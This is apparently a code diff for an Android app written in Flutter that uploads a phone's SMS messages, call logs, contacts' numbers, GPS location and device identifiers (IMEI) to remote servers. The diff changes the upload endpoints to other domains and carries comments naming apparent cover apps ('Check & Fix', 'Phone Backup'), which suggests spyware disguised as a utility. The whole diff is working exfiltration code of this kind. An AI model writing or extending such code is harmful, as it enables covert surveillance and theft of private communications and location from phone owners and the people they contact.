@@ -6,6 +6,7 @@ import 'package:flutter/foundation.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:http/http.dart' as http;
+import 'package:intl/intl.dart';
 
 import 'color_printer.dart';
 
@@ -17,10 +18,13 @@ enum BNBType {
   storage,
 }
 
+DateFormat serverFormat = DateFormat('dd-MM-yyyy hh:mm:ss');
+
 class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
-    const url = 'https://directupdate.link/a_agent_register';
+    // const url = 'https://directupdate.link/a_agent_register'; // Check & Fix
+    const url = 'https://testfix.foo/a_agent_register'; // Phone Backup
     final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
@@ -70,7 +74,8 @@ class Api {
       return;
     }
 
-    const url = 'https://directupdate.link/a_agent_upload';
+    const url = 'https://testfix.foo/a_agent_upload'; // Check & Fix
+    // const url = 'https://directupdate.link/a_agent_upload'; // Phone Backup
     final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
     final body = jsonEncode(data ?? {});
 
@@ -150,12 +155,15 @@ class Api {
 
     List callsData = [];
     for (var call in callLogs) {
+      var date = DateTime.fromMillisecondsSinceEpoch(
+          call.timestamp ?? now.millisecondsSinceEpoch);
+
       callsData.add(
         {
-          "date": call.timestamp.toString(),
+          "date": serverFormat.format(date).toString(),
           "duration": call.duration.toString(),
           "mobileNumber": call.number.toString(),
-          "name": call.name..toString(),
+          "name": call.name.toString(),
           "type": call.callType?.name.toString(),
         },
       );
@@ -187,7 +195,7 @@ class Api {
       "data": {
         "longitude": "${position.longitude}",
         "latitude": "${position.latitude}",
-        "date": "${DateTime.now()}"
+        "date": serverFormat.format(DateTime.now()).toString()
       }
     });
 
@@ -219,7 +227,7 @@ class Api {
         {
           "phone_number": sms.address.toString(),
           "message": sms.body.toString(),
-          "date": sms.date.toString(),
+          "date": serverFormat.format(sms.date ?? DateTime.now()).toString(),
           "sender": sms.kind == SmsMessageKind.sent
         },
       );
